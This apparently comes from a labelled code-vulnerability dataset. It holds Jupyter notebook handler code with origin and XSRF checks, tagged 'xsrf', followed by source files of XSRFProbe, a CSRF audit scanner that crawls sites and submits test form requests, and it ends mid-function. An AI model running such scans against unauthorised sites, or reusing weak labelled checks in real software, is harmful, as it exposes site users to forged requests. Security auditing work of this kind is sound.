        # The difference between version 8 and 13 is that in 8 the
        # client sends a ""Sec-Websocket-Origin"" header and in 13 it's
        # simply ""Origin"".
        if ""Origin"" in self.request.headers:
            origin = self.request.headers.get(""Origin"")
        else:
            origin = self.request.headers.get(""Sec-Websocket-Origin"", None)
        return origin

    # origin_to_satisfy_tornado is present because tornado requires
    # check_origin to take an origin argument, but we don't use it
    def check_origin(self, origin_to_satisfy_tornado=""""):
        """"""Check Origin for cross-site API requests, including websockets

        Copied from WebSocket with changes:

        - allow unspecified host/origin (e.g. scripts)
        - allow token-authenticated requests
        """"""
        if self.allow_origin == '*' or self.skip_check_origin():
            return True

        host = self.request.headers.get(""Host"")
        origin = self.request.headers.get(""Origin"")

        # If no header is provided, allow it.
        # Origin can be None for:
        # - same-origin (IE, Firefox)
        # - Cross-site POST form (IE, Firefox)
        # - Scripts
        # The cross-site POST (XSRF) case is handled by tornado's xsrf_token
        if origin is None or host is None:
            return True

        origin = origin.lower()
        origin_host = urlparse(origin).netloc

        # OK if origin matches host
        if origin_host == host:
            return True

        # Check CORS headers
        if self.allow_origin:
            allow = self.allow_origin == origin
        elif self.allow_origin_pat:
            allow = bool(self.allow_origin_pat.match(origin))
        else:
            # No CORS headers deny the request
            allow = False
        if not allow:
            self.log.warning(""Blocking Cross Origin API request for %s.  Origin: %s, Host: %s"",
                self.request.path, origin, host,
            )
        return allow

    def check_xsrf_cookie(self):
        """"""Bypass xsrf checks when token-authenticated""""""
        if self.token_authenticated:
            # Token-authenticated requests do not need additional XSRF-check
            # Servers without authentication are vulnerable to XSRF
            return
        return super(IPythonHandler, self).check_xsrf_cookie()

    #---------------------------------------------------------------
    # template rendering
    #---------------------------------------------------------------
    
    def get_template(self, name):
        """"""Return the jinja template object for a given name""""""
        return self.settings['jinja2_env'].get_template(name)
    
    def render_template(self, name, **ns):
        ns.update(self.template_namespace)
        template = self.get_template(name)
        return template.render(**ns)
    
    @property
    def template_namespace(self):
        return dict(
            base_url=self.base_url,
            default_url=self.default_url,
            ws_url=self.ws_url,
            logged_in=self.logged_in,
            login_available=self.login_available,
            token_available=bool(self.token or self.one_time_token),
            static_url=self.static_url,
            sys_info=sys_info,
            contents_js_source=self.contents_js_source,
            version_hash=self.version_hash,
            ignore_minified_js=self.ignore_minified_js,
            xsrf_form_html=self.xsrf_form_html,
            token=self.token,
            xsrf_token=self.xsrf_token.decode('utf8'),
            **self.jinja_template_vars
        )
    
    def get_json_body(self):
        """"""Return the body of the request as JSON data.""""""
        if not self.request.body:
            return None
        # Do we need to call body.decode('utf-8') here?
        body = self.request.body.strip().decode(u'utf-8')
        try:
            model = json.loads(body)
        except Exception:
            self.log.debug(""Bad JSON: %r"", body)
            self.log.error(""Couldn't parse JSON"", exc_info=True)
            raise web.HTTPError(400, u'Invalid JSON in body of request')
        return model

    def write_error(self, status_code, **kwargs):
        """"""render custom error pages""""""
        exc_info = kwargs.get('exc_info')
        message = ''
        status_message = responses.get(status_code, 'Unknown HTTP Error')
        exception = '(unknown)'
        if exc_info:
            exception = exc_info[1]
            # get the custom message, if defined
            try:
                message = exception.log_message % exception.args
            except Exception:
                pass
            
            # construct the custom reason, if defined
            reason = getattr(exception, 'reason', '')
            if reason:
                status_message = reason
        
        # build template namespace
        ns = dict(
            status_code=status_code,
            status_message=status_message,
            message=message,
            exception=exception,
        )
        
        self.set_header('Content-Type', 'text/html')
        # render the template
        try:
            html = self.render_template('%s.html' % status_code, **ns)
        except TemplateNotFound:
            self.log.debug(""No template for %d"", status_code)
            html = self.render_template('error.html', **ns)
        
        self.write(html)


class APIHandler(IPythonHandler):
    """"""Base class for API handlers""""""

    def prepare(self):
        if not self.check_origin():
            raise web.HTTPError(404)
        return super(APIHandler, self).prepare()

    @property
    def content_security_policy(self):
        csp = '; '.join([
                super(APIHandler, self).content_security_policy,
                ""default-src 'none'"",
            ])
        return csp
    
    def finish(self, *args, **kwargs):
        self.set_header('Content-Type', 'application/json')
        return super(APIHandler, self).finish(*args, **kwargs)

    def options(self, *args, **kwargs):
        self.set_header('Access-Control-Allow-Headers', 'accept, content-type, authorization')
        self.set_header('Access-Control-Allow-Methods',
                        'GET, PUT, POST, PATCH, DELETE, OPTIONS')
        self.finish()


class Template404(IPythonHandler):
    """"""Render our 404 template""""""
    def prepare(self):
        raise web.HTTPError(404)


class AuthenticatedFileHandler(IPythonHandler, web.StaticFileHandler):
    """"""static files should only be accessible when logged in""""""

    @web.authenticated
    def get(self, path):
        if os.path.splitext(path)[1] == '.ipynb':
            name = path.rsplit('/', 1)[-1]
            self.set_header('Content-Type', 'application/json')
            self.set_header('Content-Disposition','attachment; filename=""%s""' % escape.url_escape(name))
        
        return web.StaticFileHandler.get(self, path)
    
    def set_headers(self):
        super(AuthenticatedFileHandler, self).set_headers()
        # disable browser caching, rely on 304 replies for savings
        if ""v"" not in self.request.arguments:
            self.add_header(""Cache-Control"", ""no-cache"")
    
    def compute_etag(self):
        return None
    
    def validate_absolute_path(self, root, absolute_path):
        """"""Validate and return the absolute path.
        
        Requires tornado 3.1
        
        Adding to tornado's own handling, forbids the serving of hidden files.
        """"""
        abs_path = super(AuthenticatedFileHandler, self).validate_absolute_path(root, absolute_path)
        abs_root = os.path.abspath(root)
        if is_hidden(abs_path, abs_root):
            self.log.info(""Refusing to serve hidden file, via 404 Error"")
            raise web.HTTPError(404)
        return abs_path


def json_errors(method):
    """"""Decorate methods with this to return GitHub style JSON errors.
    
    This should be used on any JSON API on any handler method that can raise HTTPErrors.
    
    This will grab the latest HTTPError exception using sys.exc_info
    and then:
    
    1. Set the HTTP status code based on the HTTPError
    2. Create and return a JSON body with a message field describing
       the error in a human readable form.
    """"""
    @functools.wraps(method)
    @gen.coroutine
    def wrapper(self, *args, **kwargs):
        try:
            result = yield gen.maybe_future(method(self, *args, **kwargs))
        except web.HTTPError as e:
            self.set_header('Content-Type', 'application/json')
            status = e.status_code
            message = e.log_message
            self.log.warning(message)
            self.set_status(e.status_code)
            reply = dict(message=message, reason=e.reason)
            self.finish(json.dumps(reply))
        except Exception:
            self.set_header('Content-Type', 'application/json')
            self.log.error(""Unhandled error in API request"", exc_info=True)
            status = 500
            message = ""Unknown server error""
            t, value, tb = sys.exc_info()
            self.set_status(status)
            tb_text = ''.join(traceback.format_exception(t, value, tb))
            reply = dict(message=message, reason=None, traceback=tb_text)
            self.finish(json.dumps(reply))
        else:
            # FIXME: can use regular return in generators in py3
            raise gen.Return(result)
    return wrapper



#-----------------------------------------------------------------------------
# File handler
#-----------------------------------------------------------------------------

# to minimize subclass changes:
HTTPError = web.HTTPError

class FileFindHandler(IPythonHandler, web.StaticFileHandler):
    """"""subclass of StaticFileHandler for serving files from a search path""""""
    
    # cache search results, don't search for files more than once
    _static_paths = {}
    
    def set_headers(self):
        super(FileFindHandler, self).set_headers()
        # disable browser caching, rely on 304 replies for savings
        if ""v"" not in self.request.arguments or \
                any(self.request.path.startswith(path) for path in self.no_cache_paths):
            self.set_header(""Cache-Control"", ""no-cache"")
    
    def initialize(self, path, default_filename=None, no_cache_paths=None):
        self.no_cache_paths = no_cache_paths or []
        
        if isinstance(path, string_types):
            path = [path]
        
        self.root = tuple(
            os.path.abspath(os.path.expanduser(p)) + os.sep for p in path
        )
        self.default_filename = default_filename
    
    def compute_etag(self):
        return None
    
    @classmethod
    def get_absolute_path(cls, roots, path):
        """"""locate a file to serve on our static file search path""""""
        with cls._lock:
            if path in cls._static_paths:
                return cls._static_paths[path]
            try:
                abspath = os.path.abspath(filefind(path, roots))
            except IOError:
                # IOError means not found
                return ''
            
            cls._static_paths[path] = abspath
            

            log().debug(""Path %s served from %s""%(path, abspath))
            return abspath
    
    def validate_absolute_path(self, root, absolute_path):
        """"""check if the file should be served (raises 404, 403, etc.)""""""
        if absolute_path == '':
            raise web.HTTPError(404)
        
        for root in self.root:
            if (absolute_path + os.sep).startswith(root):
                break
        
        return super(FileFindHandler, self).validate_absolute_path(root, absolute_path)


class APIVersionHandler(APIHandler):

    @json_errors
    def get(self):
        # not authenticated, so give as few info as possible
        self.finish(json.dumps({""version"":notebook.__version__}))


class TrailingSlashHandler(web.RequestHandler):
    """"""Simple redirect handler that strips trailing slashes
    
    This should be the first, highest priority handler.
    """"""
    
    def get(self):
        self.redirect(self.request.uri.rstrip('/'))
    
    post = put = get


class FilesRedirectHandler(IPythonHandler):
    """"""Handler for redirecting relative URLs to the /files/ handler""""""
    
    @staticmethod
    def redirect_to_files(self, path):
        """"""make redirect logic a reusable static method
        
        so it can be called from other handlers.
        """"""
        cm = self.contents_manager
        if cm.dir_exists(path):
            # it's a *directory*, redirect to /tree
            url = url_path_join(self.base_url, 'tree', url_escape(path))
        else:
            orig_path = path
            # otherwise, redirect to /files
            parts = path.split('/')

            if not cm.file_exists(path=path) and 'files' in parts:
                # redirect without files/ iff it would 404
                # this preserves pre-2.0-style 'files/' links
                self.log.warning(""Deprecated files/ URL: %s"", orig_path)
                parts.remove('files')
                path = '/'.join(parts)

            if not cm.file_exists(path=path):
                raise web.HTTPError(404)

            url = url_path_join(self.base_url, 'files', url_escape(path))
        self.log.debug(""Redirecting %s to %s"", self.request.path, url)
        self.redirect(url)
    
    def get(self, path=''):
        return self.redirect_to_files(self, path)


class RedirectWithParams(web.RequestHandler):
    """"""Sam as web.RedirectHandler, but preserves URL parameters""""""
    def initialize(self, url, permanent=True):
        self._url = url
        self._permanent = permanent

    def get(self):
        sep = '&' if '?' in self._url else '?'
        url = sep.join([self._url, self.request.query])
        self.redirect(url, permanent=self._permanent)

#-----------------------------------------------------------------------------
# URL pattern fragments for re-use
#-----------------------------------------------------------------------------

# path matches any number of `/foo[/bar...]` or just `/` or ''
path_regex = r""(?P<path>(?:(?:/[^/]+)+|/?))""

#-----------------------------------------------------------------------------
# URL to handler mappings
#-----------------------------------------------------------------------------


default_handlers = [
    (r"".*/"", TrailingSlashHandler),
    (r""api"", APIVersionHandler)
]
/n/n/n",1,xsrf
6,2,398ed11584313a371763240392c4dda1cf986deb,"core/logger.py/n/n#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-::-:-:#
#    XSRF Probe     #
#-:-:-:-:-:-:-::-:-:#

# Author: 0xInfection
# This module requires XSRFProbe
# https://github.com/0xInfection/XSRFProbe

import os
from core.colors import *
from files.config import *
from core.verbout import verbout
from files.discovered import INTERNAL_URLS, FILES_EXEC, SCAN_ERRORS
from files.discovered import VULN_LIST, FORMS_TESTED, REQUEST_TOKENS, STRENGTH_LIST

def logger(filename, content):
    '''
    This module is for logging all the stuff we found
            while crawling and scanning.
    '''
    output_file = OUTPUT_DIR + filename + '.log'
    with open(output_file, 'w+', encoding='utf8') as f:
        if type(content) is tuple or type(content) is list:
            for m in content:  # if it is list or tuple, it is iterable
                f.write(m+'\n')
        else:
            f.write(content)  # else we write out as it is... ;)
        f.write('\n')

def pheaders(tup):
    '''
    This module prints out the headers as received in the
                    requests normally.
    '''
    verbout(GR, 'Receiving headers...\n')
    verbout(color.GREY,'  '+color.UNDERLINE+'HEADERS'+color.END+color.GREY+':'+'\n')
    for key, val in tup.items():
        verbout('  ',color.CYAN+key+': '+color.ORANGE+val)
    verbout('','')

def GetLogger():
    if INTERNAL_URLS:
        logger('internal-links', INTERNAL_URLS)
    if SCAN_ERRORS:
        logger('errored', SCAN_ERRORS)
    if FILES_EXEC:
        logger('files-found', FILES_EXEC)
    if REQUEST_TOKENS:
        logger('anti-csrf-tokens', REQUEST_TOKENS)
    if FORMS_TESTED:
        logger('forms-tested', FORMS_TESTED)
    if VULN_LIST:
        logger('vulnerabilities', VULN_LIST)
    if STRENGTH_LIST:
        logger('strengths', STRENGTH_LIST)

def ErrorLogger(url, error):
    con = '(i) '+url+' -> '+error.__str__()
    SCAN_ERRORS.append(con)

def VulnLogger(url, vuln):
    tent = '[!] '+url+' -> '+vuln
    VULN_LIST.append(tent)

def NovulLogger(url, strength):
    tent = '[+] '+url+' -> '+strength
    STRENGTH_LIST.append(tent)
/n/n/ncore/main.py/n/n#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:#
#    XSRFProbe     #
#-:-:-:-:-:-:-:-:-:#

# Author: 0xInfection
# This module requires XSRFProbe
# https://github.com/0xInfection/XSRFProbe

# Standard Package imports
import os
import re
import time
import warnings
import difflib
import http.cookiejar
from bs4 import BeautifulSoup
try:
    from urllib.parse import urlencode
    from urllib.error import HTTPError, URLError
    from urllib.request import build_opener, HTTPCookieProcessor
except ImportError:  # Throws exception in Case of Python2
    print(""\033[1;91m [-] \033[1;93mXSRFProbe\033[0m isn't compatible with Python 2.x versions.\n\033[1;91m [-] \033[0mUse Python 3.x to run \033[1;93mXSRFProbe."")
    quit()
try:
    import requests, stringdist, lxml, bs4
except ImportError:
    print(' [-] Required dependencies are not installed.\n [-] Run \033[1;93mpip3 install -r requirements.txt\033[0m to fix it.')

# Imports from core
from core.options import *
from core.colors import *
from core.inputin import inputin
from core.request import Get, Post
from core.verbout import verbout
from core.forms import form10, form20
from core.banner import banner, banabout
from core.logger import ErrorLogger, GetLogger
from core.logger import VulnLogger, NovulLogger

# Imports from files
from files.config import *
from files.discovered import FORMS_TESTED

# Imports from modules
from modules import Debugger
from modules import Parser
from modules import Crawler
from modules.Origin import Origin
from modules.Cookie import Cookie
from modules.Tamper import Tamper
from modules.Entropy import Entropy
from modules.Referer import Referer
from modules.Encoding import Encoding
from modules.Analysis import Analysis
from modules.Checkpost import PostBased
# Import Ends

# First rule, remove the warnings!
warnings.filterwarnings('ignore')

def Engine():  # lets begin it!

    os.system('clear')  # Clear shit from terminal :p
    banner()  # Print the banner
    banabout()  # The second banner
    web, fld = inputin()  # Take the input
    form1 = form10()  # Get the form 1 ready
    form2 = form20()  # Get the form 2 ready

    # For the cookies that we encounter during requests...
    Cookie0 = http.cookiejar.CookieJar()  # First as User1
    Cookie1 = http.cookiejar.CookieJar()  # Then as User2
    resp1 = build_opener(HTTPCookieProcessor(Cookie0))  # Process cookies
    resp2 = build_opener(HTTPCookieProcessor(Cookie1))  # Process cookies

    actionDone = []  # init to the done stuff

    csrf = ''  # no token initialise / invalid token
    ref_detect = 0x00  # Null Char Flag
    ori_detect = 0x00  # Null Char Flags
    form = Debugger.Form_Debugger()  # init to the form parser+token generator

    bs1 = BeautifulSoup(form1).findAll('form',action=True)[0]  # make sure the stuff works properly
    bs2 = BeautifulSoup(form2).findAll('form',action=True)[0]  # same as above

    init1 = web  # First init
    resp1.open(init1)  # Makes request as User2
    resp2.open(init1)  # Make request as User1

    # Now there are 2 different modes of scanning and crawling here.
    # 1st -> Testing a single endpoint without the --crawl flag.
    # 2nd -> Testing all endpoints with the --crawl flag.
    try:
        # Implementing the first mode. [NO CRAWL]
        if not CRAWL_SITE:
            url = web
            response = Get(url).text
            try:
                verbout(O,'Trying to parse response...')
                soup = BeautifulSoup(response)  # Parser init
            except HTMLParser.HTMLParseError:
                verbout(R,'BeautifulSoup Error: '+url)
            i = 0 # Init user number
            if REFERER_ORIGIN_CHECKS:
                # Referer Based Checks if True...
                verbout(O, 'Checking endpoint request validation via '+color.GREY+'Referer'+color.END+' Checks...')
                if Referer(url):
                    ref_detect = 0x01
                verbout(O, 'Confirming the vulnerability...')

                # We have finished with Referer Based Checks, lets go for Origin Based Ones...
                verbout(O, 'Confirming endpoint request validation via '+color.GREY+'Origin'+color.END+' Checks...')
                if Origin(url):
                    ori_detect = 0x01
            if COOKIE_BASED:
                Cookie(url)
            # Now lets get the forms...
            verbout(O, 'Retrieving all forms on ' +color.GREY+url+color.END+'...')
            for m in Debugger.getAllForms(soup):  # iterating over all forms extracted
                verbout(O,'Testing form:\n\n'+color.CYAN+' %s' % (m.prettify()))
                FORMS_TESTED.append('(i) '+url+':\n\n'+m.prettify()+'\n')
                try:
                    if m['action']:
                        pass
                except KeyError:
                    m['action'] = '/' + url.rsplit('/', 1)[1]
                    ErrorLogger(url, 'No standard form ""action"".')
                action = Parser.buildAction(url, m['action'])  # get all forms which have 'action' attribute
                if not action in actionDone and action!='':  # if url returned is not a null value nor duplicate...
                    # If form submission is kept to True
                    if FORM_SUBMISSION:
                        try:
                            # NOTE: Slow connections may cause read timeouts which may result in AttributeError
                            result, genpoc = form.prepareFormInputs(m)  # prepare inputs
                            r1 = Post(url, action, result).text  # make request with token values generated as user1
                            result, genpoc = form.prepareFormInputs(m)  # prepare the input types
                            r2 = Post(url, action, result).text  # again make request with token values generated as user2
                            # Go for token based entropy checks...
                            try:
                                if m['name']:
                                    query, token = Entropy(result, url, m['action'], m['name'])
                            except KeyError:
                                query, token = Entropy(result, url, m['action'])
                            # Now its time to detect the encoding type (if any) of the Anti-CSRF token.
                            fnd = Encoding(token)
                            if fnd == 0x01:
                                VulnLogger(url, 'Token is a string encoded value which can be probably decrypted.')
                            else:
                                NovulLogger(url, 'Anti-CSRF token is not a string encoded value.')
                            # Go for token parameter tamper checks.
                            if (query and token):
                                Tamper(url, action, result, r2, query, token)
                            o2 = resp2.open(url).read()  # make request as user2
                            try:
                                form2 = Debugger.getAllForms(BeautifulSoup(o2))[i]  # user2 gets his form
                            except IndexError:
                                verbout(R, 'Form Error')
                                ErrorLogger(url, 'Form Index Error.')
                                continue  # making sure program won't end here (dirty fix :( )
                            verbout(GR, 'Preparing form inputs...')
                            contents2, genpoc = form.prepareFormInputs(form2)  # prepare for form 2 as user2
                            r3 = Post(url,action,contents2).text  # make request as user3 with user2's form
                            if POST_BASED and not query and not token:
                                try:
                                    if m['name']:
                                        PostBased(url, r1, r2, r3, m['action'], result, genpoc, m['name'])
                                except KeyError:
                                    PostBased(url, r1, r2, r3, m['action'], result, genpoc)
                            else:
                                print(color.GREEN+' [+] The form was requested with a Anti-CSRF token.')
                                print(color.GREEN+' [+] Endpoint '+color.BG+' NOT VULNERABLE '+color.END+color.GREEN+' to POST-Based CSRF Attacks!')
                                NovulLogger(url, 'Not vulnerable to POST-Based CSRF Attacks.')
                        except HTTPError as msg:  # if runtime exception...
                            verbout(R, 'Exception : '+msg.__str__())  # again exception :(
                            ErrorLogger(url, msg)

                actionDone.append(action)  # add the stuff done
                i+=1  # Increase user iteration

        else:
            # Implementing the 2nd mode [CRAWLING AND SCANNING].
            verbout(GR, ""Initializing crawling and scanning..."")
            crawler = Crawler.Handler(init1, resp1)  # Init to the Crawler handler

            while crawler.noinit():  # Until 0 urls left
                url = next(crawler)  # Go for next!

                print(C+'Testing :> '+color.CYAN+url)  # Display what url its crawling

                try:
                    soup = crawler.process(fld)  # Start the parser
                    if not soup:
                        continue  # Making sure not to end the program yet...
                    i = 0  # Set count = 0 (user number 0, which will be subsequently incremented)
                    if REFERER_ORIGIN_CHECKS:
                        # Referer Based Checks if True...
                        verbout(O, 'Checking endpoint request validation via '+color.GREY+'Referer'+color.END+' Checks...')
                        if Referer(url):
                            ref_detect = 0x01
                        verbout(O, 'Confirming the vulnerability...')

                        # We have finished with Referer Based Checks, lets go for Origin Based Ones...
                        verbout(O, 'Confirming endpoint request validation via '+color.GREY+'Origin'+color.END+' Checks...')
                        if Origin(url):
                            ori_detect = 0x01

                    if COOKIE_BASED:
                        Cookie(url)

                    # Now lets get the forms...
                    verbout(O, 'Retrieving all forms on ' +color.GREY+url+color.END+'...')
                    for m in Debugger.getAllForms(soup):  # iterating over all forms extracted
                        FORMS_TESTED.append('(i) '+url+':\n\n'+m.prettify()+'\n')
                        try:
                            if m['action']:
                                pass
                        except KeyError:
                            m['action'] = '/' + url.rsplit('/', 1)[1]
                            ErrorLogger(url, 'No standard ""action"" attribute.')
                        action = Parser.buildAction(url, m['action'])  # get all forms which have 'action' attribute
                        if not action in actionDone and action != '':  # if url returned is not a null value nor duplicate...
                            # If form submission is kept to True
                            if FORM_SUBMISSION:
                                try:
                                    result, genpoc = form.prepareFormInputs(m)  # prepare inputs
                                    r1 = Post(url, action, result).text  # make request with token values generated as user1
                                    result, genpoc = form.prepareFormInputs(m)  # prepare the input types
                                    r2 = Post(url, action, result).text  # again make request with token values generated as user2
                                    # Go for token based entropy checks...
                                    try:
                                        if m['name']:
                                            query, token = Entropy(result, url, m['action'], m['name'])
                                    except KeyError:
                                        query, token = Entropy(result, url, m['action'])
                                        ErrorLogger(url, 'No standard form ""name"".')
                                    # Now its time to detect the encoding type (if any) of the Anti-CSRF token.
                                    fnd = Encoding(token)
                                    if fnd == 0x01:
                                        VulnLogger(url, 'String encoded token value. Token might be decrypted.')
                                    else:
                                        NovulLogger(url, 'Anti-CSRF token is not a string encoded value.')
                                    # Go for token parameter tamper checks.
                                    if (query and token):
                                        Tamper(url, action, result, r2, query, token)
                                    o2 = resp2.open(url).read()  # make request as user2
                                    try:
                                        form2 = Debugger.getAllForms(BeautifulSoup(o2))[i]  # user2 gets his form
                                    except IndexError:
                                        verbout(R, 'Form Error')
                                        ErrorLogger(url, 'Form Index Error.')
                                        continue  # making sure program won't end here (dirty fix :( )
                                    verbout(GR, 'Preparing form inputs...')
                                    contents2, genpoc = form.prepareFormInputs(form2)  # prepare for form 2 as user2
                                    r3 = Post(url,action,contents2).text  # make request as user3 with user2's form
                                    if POST_BASED and not query and not token:
                                        try:
                                            if m['name']:
                                                PostBased(url, r1, r2, r3, m['action'], result, genpoc, m['name'])
                                        except KeyError:
                                            PostBased(url, r1, r2, r3, m['action'], result, genpoc)
                                    else:
                                        print(color.GREEN+' [+] The form was requested with a Anti-CSRF token.')
                                        print(color.GREEN+' [+] Endpoint '+color.BG+' NOT VULNERABLE '+color.END+color.GREEN+' to P0ST-Based CSRF Attacks!')
                                        NovulLogger(url, 'Not vulnerable to POST-Based CSRF Attacks.')
                                except HTTPError as msg:  # if runtime exception...
                                    verbout(color.RED, ' [-] Exception : '+color.END+msg.__str__())  # again exception :(
                                    ErrorLogger(url, msg)
                        actionDone.append(action)  # add the stuff done
                        i+=1  # Increase user iteration
                except URLError as e:  # if again...
                    verbout(R, 'Exception at : '+url)  # again exception -_-
                    time.sleep(0.4)
                    verbout(O, 'Moving on...')
                    ErrorLogger(url, e)
                    continue  # make sure it doesn't stop at exceptions
                # This error usually happens when some sites are protected by some load balancer
                # example Cloudflare. These domains return a 403 forbidden response in various
                # contexts. For example when making reverse DNS queries.
                except HTTPError as e:
                    if str(e.code) == '403':
                        verbout(R, 'HTTP Authentication Error!')
                        verbout(R, 'Error Code : ' +O+ str(e.code))
                        ErrorLogger(url, e)
                        quit()
        GetLogger()  # The scanning has finished, so now we can log out all the links ;)
        print('\n'+G+""Scan completed!""+'\n')
        Analysis()  # For Post Scan Analysis
    except KeyboardInterrupt as e:  # Incase user wants to exit :') (while crawling)
        verbout(R, 'User Interrupt!')
        time.sleep(1.5)
        Analysis()  # For Post scan Analysis
        print(R+'Aborted!')  # say goodbye
        ErrorLogger('KeyBoard Interrupt', 'Aborted')
        quit()
    except Exception as e:
        verbout(R, e.__str__())
        ErrorLogger(url, e)
/n/n/ncore/options.py/n/n#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-::-:-:#
#    XSRF Probe     #
#-:-:-:-:-:-:-::-:-:#

# Author: 0xInfection
# This module requires XSRFProbe
# https://github.com/0xInfection/XSRFProbe

# Importing stuff
import argparse, sys, tld
import urllib.parse, os
from files import config
from core.colors import R, G
from core.updater import updater

# Processing command line arguments
parser = argparse.ArgumentParser('python3 xsrfprobe.py')
parser._action_groups.pop()

# A simple hack to have required argumentsa and optional arguments separately
required = parser.add_argument_group('Required Arguments')
optional = parser.add_argument_group('Optional Arguments')

# Required Options
required.add_argument('-u', '--url', help='Main URL to test', dest='url')

# Optional Arguments (main stuff and necessary)
optional.add_argument('-c', '--cookie', help='Cookie value to be requested with each successive request. If there are multiple cookies, separate them with commas. For example: `-c PHPSESSID=i837c5n83u4, _gid=jdhfbuysf`.', dest='cookie')
optional.add_argument('-o', '--output', help='Output directory where files to be stored. Default is the`files` folder where all files generated will be stored.', dest='output')
optional.add_argument('-d', '--delay', help='Time delay between requests in seconds. Default is zero.', dest='delay', type=float)
optional.add_argument('-q', '--quiet', help='Set the DEBUG mode to quiet. Report only when vulnerabilities are found. Minimal output will be printed on screen. ', dest='quiet', action='store_true')
optional.add_argument('-v', '--verbose', help='Increase the verbosity of the output (e.g., -vv is more than -v). ', dest='verbose', action='store_true')

# Other Options
# optional.add_argument('-h', '--help', help='Show this help message and exit', dest='disp', default=argparse.SUPPRESS, action='store_true')
optional.add_argument('--user-agent', help='Custom user-agent to be used. Only one user-agent can be specified.', dest='user_agent', type=str)
optional.add_argument('--headers', help='Comma separated list of custom headers you\'d want to use. For example: ``--headers ""Accept=text/php, X-Requested-With=Dumb""``.', dest='headers', type=str)
optional.add_argument('--exclude', help='Comma separated list of paths or directories to be excluded which are not in scope. These paths/dirs won\'t be scanned. For example: `--exclude somepage/, sensitive-dir/, pleasedontscan/`', dest='exclude', type=str)
optional.add_argument('--timeout', help='HTTP request timeout value in seconds. The entered value must be in floating point decimal. Example: ``--timeout 10.0``', dest='timeout', type=float)
optional.add_argument('--max-chars', help='Maximum allowed character length for the custom token value to be generated. For example: `--max-chars 5`. Default value is 6.', dest='maxchars', type=int)
optional.add_argument('--crawl', help=""Crawl the whole site and simultaneously test all discovered endpoints for CSRF."", dest='crawl', action='store_true')
optional.add_argument('--skip-analysis', help='Skip the Post-Scan Analysis of Tokens which were gathered during requests', dest='skipal', action='store_true')
optional.add_argument('--skip-poc', help='Skip the PoC Form Generation of POST-Based Cross Site Request Forgeries.', dest='skippoc', action='store_true')
optional.add_argument('--display', help='Print out response headers of requests while making requests.', dest='disphead', action='store_true')
optional.add_argument('--update', help='Update XSRFProbe to latest version on GitHub via git.', dest='update', action='store_true')
optional.add_argument('--random-agent', help='Use random user-agents for making requests.', dest='randagent', action='store_true')
optional.add_argument('--version', help='Display the version of XSRFProbe and exit.', dest='version', action='store_true')
args = parser.parse_args()

if not len(sys.argv) > 1:
    print('''
    \033[1;91mXSRFProbe\033[0m, \033[1;97mA \033[1;93mCross Site Request Forgery \033[1;97mAudit Toolkit\033[0m
''')
    parser.print_help()
    quit('')

# Update XSRFProbe to latest version
if args.update:
    updater()
    quit('')

# Print out XSRFProbe version
if args.version:
    print('\n\033[1;97m [+] \033[1;91mXSRFProbe Version\033[0m : \033[1;97m'+open('files/VersionNum').read())
    quit()

# Now lets update some global config variables
if args.maxchars:
    config.TOKEN_GENERATION_LENGTH = args.maxchars

# Setting custom user-agent
if args.user_agent:
    config.USER_AGENT = args.user_agent

# Option to skip analysis
if args.skipal:
    config.SCAN_ANALYSIS = False

# Option to skip poc generation
if args.skippoc:
    config.POC_GENERATION = False

# Updating main root url
if not args.version and not args.update:
    if args.url: # and not args.help:
        if 'http' in args.url:
            config.SITE_URL = args.url
        else:
            config.SITE_URL = 'http://'+args.url
    else:
        print(R+'You must supply a url/endpoint.')

# Crawl the site if --crawl supplied.
if args.crawl:
    config.CRAWL_SITE = True
    # Turning off the display header feature due to too much log generation.
    config.DISPLAY_HEADERS = False

if args.cookie:
    # Assigning Cookie
    if ',' in args.cookie:
        for cook in args.cookie.split(','):
            config.COOKIE_VALUE.append(cook.strip())
            # This is necessary when a cookie value is supplied
            # Since if the user-agent used to make the request changes
            # from time to time, the remote site might trigger up
            # security mechanisms (or worse, perhaps block your ip?)
            config.USER_AGENT_RANDOM = False

# Set the headers displayer to 1 (actively display headers)
if args.disphead:
    config.DISPLAY_HEADERS = True

# Timeout value
if args.timeout:
    config.TIMEOUT_VALUE = args.timeout

# Custom header values if specified
if args.headers:
    # NOTE: As a default idea, when the user supplies custom headers, we
    # simply add the custom headers to a list of existing headers in
    # files/config.py.
    # Uncomment the following lines to just reinitialise the headers everytime
    # they make a request.
    #
    #config.HEADER_VALUES = {}
    for m in args.headers.split(','):
        config.HEADER_VALUES[m.split('=')[0]] = m.split('=')[1]  # nice hack ;)

if args.exclude:
    exc = args.exclude
    #config.EXCLUDE_URLS = [s for s in exc.split(',').strip()]
    m = exc.split(',').strip()
    for s in m:
        config.EXCLUDE_DIRS.append(urllib.parse.urljoin(config.SITE_URL, s))

if args.randagent:
    # If random-agent argument supplied...
    config.USER_AGENT_RANDOM = True
    # Turn off a single User-Agent mechanism...
    config.USER_AGENT = ''

if config.SITE_URL:
    if args.output:
        # If output directory is mentioned...
        try:
            if not os.path.exists(args.output+tld.get_fld(config.SITE_URL)):
                os.makedirs(args.output+tld.get_fld(config.SITE_URL))
        except FileExistsError:
            pass
        config.OUTPUT_DIR = args.output+tld.get_fld(config.SITE_URL) + '/'
    else:
        try:
            os.makedirs(tld.get_fld(config.SITE_URL))
        except FileExistsError:
            pass
        config.OUTPUT_DIR = tld.get_fld(config.SITE_URL) + '/'

if args.quiet:
    config.DEBUG = False
/n/n/ncore/utils.py/n/n#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:#
#    XSRFProbe     #
#-:-:-:-:-:-:-:-:-:#

# Author: 0xInfection
# This module requires XSRFProbe
# https://github.com/0xInfection/XSRFProbe

from difflib import SequenceMatcher

def sameSequence(str1,str2):
    '''
    This function is intended to find same sequence
                between str1 and str2.
    '''
    # Initialize SequenceMatcher object with
    # Input string
    seqMatch = SequenceMatcher(None, str1, str2)

    # Find match of longest sub-string
    # Output will be like Match(a=0, b=0, size=5)
    match = seqMatch.find_longest_match(0, len(str1), 0, len(str2))

    # Print longest substring
    if (match.size!=0):
        return (str1[match.a: match.a + match.size])
    else:
        return ''

def replaceStrIndex(text, index=0, replacement=''):
    '''
    This method returns a tampered string by
                    replacement
    '''
    return '%s%s%s' % (text[:index], replacement, text[index+1:])

def checkDuplicates(iterable):
    '''
    This function works as a byte sequence checker for
            tuples passed onto this function.
    '''
    seen = set()
